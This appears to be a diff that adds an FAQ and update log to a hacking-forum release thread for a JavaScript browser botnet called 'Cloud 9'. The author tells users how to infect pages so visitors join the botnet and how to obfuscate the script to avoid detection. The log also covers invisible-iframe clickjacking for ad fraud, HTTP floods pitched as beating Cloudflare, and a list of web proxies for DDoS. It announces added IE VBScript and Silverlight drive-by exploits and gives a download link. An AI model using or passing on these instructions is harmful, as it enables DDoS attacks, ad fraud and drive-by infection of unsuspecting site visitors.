@@ -63,3 +63,206 @@ I suggest putting a movie on the page so people will stay on the botnet for long
 Happy hacking! 
 
 https://hackforums.net/showthread.php?tid=5473222
+
+FAQ:-
+
+akanz Wrote:  
+i put in the master the link where will be installed botnet and on the panel i changed the user pass but what now what i need to do now ???
+
+To infect a page simply put this html on it:
+http ://pastebin .com/eDRgnxN9
+
+Then whoever visits the page will be on the botnet for as long as they are on the page.
+
+I suggest putting a movie on the page so people will stay on the botnet for longer. (Good for ddos attacks)
+
+
+
+
+
+akanz Wrote:  
+SynthMesc I have installed but "Warning: file_get_contents(../logs/online.txt): failed to open stream: No such file or directory in 21 line"
+
+Warning: file(../logs/main.txt): failed to open stream: No such file or directory in 113 line
+
+please any suggestion or if you have skype i need your help.
+
+Go into the logs folder then
+Create a file called online.txt and put "0" in it. Nothing but a zero.
+
+Next create a new file called main.txt
+And it should work now.
+
+Also obfuscate your campaign.js using this JavaScript obfuscator:
+https ://javascriptobfuscator.com/Javascript-Obfuscator.aspx
+
+
+
+
+
+
+
+akanz Wrote:  
+ok so now is everythink okey how to use this one for g00gl3 ads "jack*[iframe]*[width]*[height]*
+
+Basically make a button for your advertisement, then set the width to the width of the button and height to the height of the button.
+
+Pretty simple.
+If you wanna debug set:
+Code 
+var css = '<style>iframe { position:absolute; filter:alpha(opacity=0); opacity:0.0; border: None left:0; top:0; }</style>';
+[code]
+To:
+[code]
+var css = '<style>iframe { position:absolute; filter:alpha(opacity=50); opacity:0.5; border: None left:0; top:0; }</style>';
+Ezpz
+
+
+
+
+
+NEW DDOS FUNCTION: ANTIDDOS
+
+The antiddos command works the same way as the load command, it can take out cloudflare sites! Or cloudflare like protected sites!
+
+Also to obfuscate your campaign.js use this JavaScript obfuscator:
+
+http://javascriptobfuscator.com/Javascri...cator.aspx
+
+It will make your JavaScript botnet FUD and unreadable
+
+Screenshot of a botnet using hitleap
+Spoiler (Click to View)
+
+As always, happy hacking
+
+Cheers
+
+
+
+
+
+I see that the zip didnt store the folders properly, so move all the .gif files into a folder called "flags" and move "online.txt" and "main.txt" into a folder called "logs"
+
+Once you do that the panel should work perfectly
+
+
+
+
+saif Wrote:  
+hello.
+plz tell me about load option.
+can bot execute exe file after load?
+
+No, load is used for HTTP/HTTPS flooding
+
+
+
+
+AlirezaVF Wrote:  
+this will be exploit kit ! when you can excute an exe file on the target
+
+I am actually thinking of adding a vbscript download and execute to it, and since it has browser detection,I can easily target the exploits 
+
+All updates are free as usual.
+
+
+
+Codefuser Wrote:  
+Since it is a free release and what not, thanks a lot etc.
+However you must realize that a javascript botnet is extremely "bad". It has no persistence, close the browser and it is gone, does not have access to the system, etc.
+
+Well JavaScript has extreme limitations for security, I plan to add exploits to it soon
+
+
+
+
+AlirezaVF Wrote:  
+add old exploits or you are plan to code new exploits?
+
+Old, I just added a vbscript exploit for IE, I plan to add more soon
+
+
+
+Just fixed the zip, it should work out of the box now 
+
+Just remember to edit notFound.php, campaign.js and admin/panel4829.php
+
+
+
+
+NEW UPDATE!!!
+
+NOW HAS PERSISTENCE!!!!!
+
+I stole some code from a malicious website so now the back button is disabled! No one can exit the page using the back button now!
+
+Silverlight drive by has been added as well!
+
+Cheers everyone!
+
+
+
+SECURITY ALERT TO EVERYONE USING CLOUD 9
+
+SEVERAL CRITICAL XSS VULNERABILITIES HAVE BEEN PATCHED. RE DOWNLOAD IMMEDIATELY
+
+I also added iframe break out, so most traffic exchange sites will be stuck on your botnet! They won't be able to redirect to the next page
+
+Cheers!
+The javascript code and exploits are FUD
+
+https://www.virustotal.com/en/url/f16c7c...482894680/
+
+
+
+Codefuser Wrote:  
+> Anti back button
+> Persistence
+Why don't you just give up and go do website design or some shit for money instead? This is getting cancerous.
+
+Well this is JavaScript we are talking about. There is not much you can do for persistence.
+
+
+
+
+
+
+
+Now added glype DDoS, now you can DDoS websites using online proxies! 
+Make sure you have your glype list like this:
+Code 
+https://www.hidenseek.org/browse.php?u=http://www.whatismyip.com&b=26
+https://www.youcanhide.net/browse.php?u=https://www.whatismyip.com&b=26&f=norefer
+http://simpleproxy.net/browse.php?u=https://www.whatismyip.com&b=26&f=norefer
+http://hidefromyou.com/index.php?q=https://www.whatismyip.com
+https://myproxy.info/browse.php?u=https://www.whatismyip.com&b=26
+http://freeninjaproxy.info/browse.php?u=https://www.whatismyip.com&b=26
+http://getprivate.eu/browse.php?u=https://www.whatismyip.com&b=26&f=norefer
+http://unblockwebsites.bestforever.com/browse.php?u=http://www.whatismyip.com&b=12&f=norefer
+http://www.proxy-service.com.de/index.php?q=https://www.whatismyip.com
+http://ciproxy.de/browse.php?u=https://www.whatismyip.com&b=26
+http://anzas21.sakura.ne.jp/proxy/browse.php?u=https://www.whatismyip.com&b=30
+http://proxymexico.com/browse.php?u=https://www.whatismyip.com&b=29
+http://hideme.nl/browse.php?u=https://www.whatismyip.com&b=26
+https://proxay.co.uk/browse.php?u=https://www.whatismyip.com&b=30
+http://ukwebproxy.eu/browse.php?u=https://www.whatismyip.com&b=26
+http://ploxey.com/browse.php?u=https://www.whatismyip.com&b=26
+https://www.proxsei.com/portal.php?u=https://www.whatismyip.com&b=114
+http://proxyweb.com.es/browse.php?u=https://www.whatismyip.com&b=26
+http://videoproxysites.com/browse.php?u=https://www.whatismyip.com&b=26
+http://darmowe-proxy.pl/browse.php?u=https://www.whatismyip.com&b=24
+http://proxyaka.com/index.php?q=https://www.whatismyip.com&hl=107
+
+Download as usual is http://browsersecurity.gq/cloud9-latest.zip
+
+Also new update, you no longer have to edit notFound.php
+
+Cheers
+
+
+
+
+
+
+
